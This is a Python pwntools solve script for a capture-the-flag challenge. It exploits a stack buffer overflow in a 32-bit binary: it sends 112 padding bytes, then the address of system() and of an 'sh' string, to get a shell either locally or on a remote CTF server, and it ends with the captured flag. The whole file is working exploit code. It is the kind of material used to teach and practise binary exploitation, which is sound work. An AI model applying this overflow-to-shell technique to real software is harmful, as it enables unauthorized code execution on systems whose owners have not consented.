#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')

# Invoke with './solve.py [GDB|REMOTE|<nothing>]'
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('welcome_message.ctf.fifthdoma.in', 9999)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
set follow-fork-mode parent
break *0x804920d
continue
'''.format(**locals())

# Address of 'sh' in chats string 
# --> “AdminKnowsBetter: Huh! I wish” 
bin_sh = 0x0804a0db

# Address of system() symbol in binary
system = exe.sym['system']

payload = b"A"*112
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(bin_sh)

io = start()
io.recvuntil(b"your name: ")
io.sendline(payload)
io.interactive()

# flag{w3lc0m3_gu3st5_Pwn1nG_15_alw4ys_c00l}
